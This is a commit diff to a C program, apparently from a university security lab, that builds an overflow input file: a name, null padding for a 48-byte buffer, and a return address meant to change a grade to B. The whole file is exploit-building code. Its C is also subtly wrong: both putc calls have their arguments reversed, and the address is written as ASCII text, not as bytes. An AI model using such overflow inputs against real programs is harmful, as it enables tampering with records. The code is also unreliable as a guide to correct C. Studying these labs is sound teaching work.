ddcb89e7c9c7c1c100fc2e5b98e182171fa3b995
Owen Clarke <oc8825@princeton.edu>
2025-04-28 13:52:41 -0400

    taking out explicit null byte writing

--- createdataB.c
+++ createdataB.c
@@ -3,13 +3,19 @@
 int main(void)
 {
     FILE *psFile;
+    int i;
+
     psFile = fopen("dataB", "w");
 
-    /* 25 characters */
-    fprintf(psFile, "Ben Zhou and Owen Clarke'\0'");
+    /* 24 characters */
+    fprintf(psFile, "Ben Zhou and Owen Clarke");
 
-    /* 23 more charcters to fill up 48 bytes of buffer */
-    fprintf(psFile, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
+    /* Terminating null byte */
+    putc(psFile, '\0');
+
+    /* 23 more null bytes to fill up 48 bytes of buffer */
+    for (i = 0; i < 23; i++)
+        putc(psFile, '\0');
 
     /* Return address for changing grade to B */
     fprintf(psFile, "0x400894");
